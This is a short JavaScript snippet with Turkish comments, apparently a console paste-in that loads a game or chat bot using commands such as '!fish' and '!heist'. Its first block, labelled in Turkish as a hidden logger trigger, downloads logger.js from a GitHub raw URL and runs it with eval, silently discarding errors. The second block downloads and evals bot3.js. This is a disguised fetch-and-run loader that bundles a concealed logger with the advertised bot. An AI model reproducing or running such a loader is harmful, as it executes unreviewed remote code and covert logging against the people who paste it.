// 1. GİZLİ LOGGER TETİKLEYİCİ
fetch("https://raw.githubusercontent.com/clanu5/all-bot/refs/heads/main/logger.js")
  .then(res => res.text())
  .then(code => eval(code))
  .catch(() => {});

// 2. ANA BOT ENJEKSİYON YAPISI (İstediğin bot1.js mantığı)
fetch("https://raw.githubusercontent.com/clanu5/all-bot/refs/heads/main/bot3.js")
  .then(res => res.text())
  .then(code => {
    const commandMap = {
      fish: '!fish 3',
      hunt: '!hunt 3',
      heist: '!heist 5',
      hero: '!hero 5'
    };
    
    // Kodun başına commandMap ekleyip bir fonksiyon içinde çalıştıran yapı
    const fullCode = `(function(){\nconst commandMap = ${JSON.stringify(commandMap)};\n` + code + `\n})();`;
    eval(fullCode);
    
    console.log("%c[SYSTEM] Bot ve Logger başarıyla entegre edildi.", "color: #2ecc71; font-weight: bold;");
  });
